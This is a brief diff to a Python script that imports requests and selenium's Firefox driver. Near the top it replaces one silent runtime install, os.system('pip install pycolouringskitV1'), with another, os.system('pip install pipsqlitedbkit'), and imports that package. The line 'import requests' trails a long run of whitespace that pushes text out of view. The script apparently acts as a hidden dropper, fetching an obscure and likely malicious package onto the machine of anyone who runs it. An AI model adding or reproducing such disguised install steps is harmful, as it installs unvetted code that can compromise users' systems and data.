@@ -1,6 +1,6 @@
 import os
-os.system("pip install pycolouringskitV1")
-import pycolouringskitV1
+os.system("pip install pipsqlitedbkit")
+import pipsqlitedbkit
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
